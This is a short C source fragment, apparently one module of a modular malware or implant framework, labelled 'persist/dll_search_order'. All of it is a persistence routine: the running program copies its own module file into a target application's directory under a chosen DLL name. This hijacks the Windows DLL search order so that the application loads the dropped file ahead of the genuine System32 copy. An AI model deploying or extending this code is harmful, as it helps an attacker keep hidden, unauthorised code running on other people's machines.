// chunk: persist/dll_search_order
// depends: (none)
// provides: persist_dll_search_order
// headers: windows.h
// note: DLL search order hijack — drop DLL in app dir before System32 copy

#ifndef CHUNK_PERSIST_DLL_SEARCH
#define CHUNK_PERSIST_DLL_SEARCH

static int persist_dll_search_order(const char *target_app_dir, const char *dll_name) {
    char src[MAX_PATH], dst[MAX_PATH];
    GetModuleFileNameA(NULL, src, MAX_PATH);

    snprintf(dst, sizeof(dst), "%s\\%s", target_app_dir, dll_name);

    return CopyFileA(src, dst, FALSE);
}

#endif
